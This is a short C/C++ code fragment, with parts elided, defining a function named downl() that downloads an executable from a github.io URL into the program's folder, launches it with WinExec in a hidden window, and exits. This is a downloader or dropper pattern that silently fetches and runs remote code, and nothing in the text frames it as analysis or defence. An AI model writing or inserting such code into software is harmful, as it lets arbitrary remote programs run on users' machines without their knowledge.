...
void downl()
{
	...
	download1("https://ykr666.github.io/program.exe", sCurrentPath + "\\program.exe");
	WinExec(sCurrentPath + "\\program.exe", HIDE_WINDOW);
	exit(0);
}
